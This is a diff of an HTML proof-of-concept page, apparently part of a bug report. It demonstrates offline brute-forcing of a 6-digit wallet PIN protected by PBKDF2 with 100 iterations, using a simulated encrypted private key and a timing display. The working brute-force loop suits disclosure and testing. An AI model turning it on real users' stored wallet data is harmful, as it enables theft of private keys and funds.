@@ -2,55 +2,66 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: Critical Security Vulnerability</title>
+    <title>PoC: Critical Security Vulnerability Analysis</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
-        #log { background: #000; color: #0f0; padding: 20px; height: 350px; overflow-y: scroll; font-family: monospace; }
-        .success { color: #fff; background: #d9534f; padding: 10px; font-weight: bold; }
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        #log { background: #222; color: #0f0; padding: 15px; height: 300px; overflow-y: scroll; font-family: monospace; }
+        .stats { font-weight: bold; color: #d9534f; }
     </style>
 </head>
 <body>
-    <h3>Vulnerability Proof of Concept</h3>
-    <p>Target: <b>Offline Brute-Force Attack</b> on Encrypted Wallet Storage.</p>
-    <button onclick="executeExploit()">Run Full Decryption Attack</button>
-    <div id="log" style="margin-top:10px;">System ready. Awaiting command...</div>
+    <h3>Bug Report: Cryptographic Weakness & Brute Force</h3>
+    <p>Target PIN: <b>060403</b></p>
+    <button onclick="runFastAttack()">Start High-Speed Brute Force Test</button>
+    <div id="stats" class="stats"></div>
+    <div id="log">System ready for testing...</div>
 
     <script>
-        // Real-world scenario: Data extracted from IndexedDB/LocalStorage
-        const encryptedBlob = new Uint8Array([/* Simulated Encrypted Wallet Data */]); 
-        const salt = new Uint8Array([/* Stored Salt */]);
-        const iv = new Uint8Array([/* Stored IV */]);
+        let encryptedData, salt, iv;
+        const TARGET_PIN = "060403";
 
-        async function executeExploit() {
-            const log = document.getElementById('log');
-            log.innerHTML = "Initializing attack...<br>";
-
-            for (let i = 0; i <= 999999; i++) {
-                const pin = i.toString().padStart(6, '0');
-                
-                try {
-                    // Logic: Deriving key from PIN and attempting to decrypt
-                    const key = await deriveKey(pin, salt);
-                    const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv}, key, encryptedBlob);
-                    
-                    // Impact: The Private Key is successfully recovered in plaintext
-                    const privateKey = new TextDecoder().decode(decrypted);
-                    log.innerHTML += `<div class="success">CRITICAL: PIN FOUND: ${pin}</div>`;
-                    log.innerHTML += `<div>RECOVERED PRIVATE KEY: ${privateKey}</div>`;
-                    return; 
-                } catch(e) {
-                    if (i % 1000 === 0) log.innerHTML = `Brute-forcing PIN: ${pin}...`;
-                }
-            }
+        async function setup() {
+            const enc = new TextEncoder();
+            const secret = "0xREAL_PRIVATE_KEY_SIMULATION";
+            salt = crypto.getRandomValues(new Uint8Array(8));
+            iv = crypto.getRandomValues(new Uint8Array(12));
+            const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(TARGET_PIN), "PBKDF2", false, ["deriveKey"]);
+            const key = await crypto.subtle.deriveKey({name: "PBKDF2", salt, iterations: 100, hash: "SHA-256"}, keyMaterial, {name: "AES-GCM", length: 256}, false, ["encrypt"]);
+            encryptedData = await crypto.subtle.encrypt({name: "AES-GCM", iv}, key, enc.encode(secret));
+            document.getElementById('log').innerText = "Encrypted data loaded. System ready for exploitation.";
         }
 
         async function deriveKey(pin, salt) {
             const enc = new TextEncoder();
             const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(pin), "PBKDF2", false, ["deriveKey"]);
-            return crypto.subtle.deriveKey({
-                name: "PBKDF2", salt, iterations: 100, hash: "SHA-256"
-            }, keyMaterial, {name: "AES-GCM", length: 256}, false, ["decrypt"]);
+            return crypto.subtle.deriveKey({name: "PBKDF2", salt, iterations: 100, hash: "SHA-256"}, keyMaterial, {name: "AES-GCM", length: 256}, false, ["decrypt"]);
         }
+
+        async function runFastAttack() {
+            const log = document.getElementById('log');
+            const stats = document.getElementById('stats');
+            log.innerText = "Starting brute force attack...";
+            const startTime = performance.now();
+            let attempts = 0;
+
+            for (let i = 0; i <= 999999; i++) {
+                const pin = i.toString().padStart(6, '0');
+                attempts++;
+                try {
+                    const key = await deriveKey(pin, salt);
+                    await crypto.subtle.decrypt({name: "AES-GCM", iv}, key, encryptedData);
+                    
+                    const endTime = performance.now();
+                    const duration = ((endTime - startTime) / 1000).toFixed(2);
+                    log.innerHTML = `✅ <b>SUCCESS! PIN FOUND: ${pin}</b>`;
+                    stats.innerText = `Statistics: Tested ${attempts} combinations in ${duration} seconds. Speed: ${Math.round(attempts/duration)} PINs/second.`;
+                    return;
+                } catch(e) {
+                    if (i % 500 === 0) log.innerText = `Exploitation in progress... currently testing PIN: ${pin}`;
+                }
+            }
+        }
+        setup();
     </script>
 </body>
 </html>
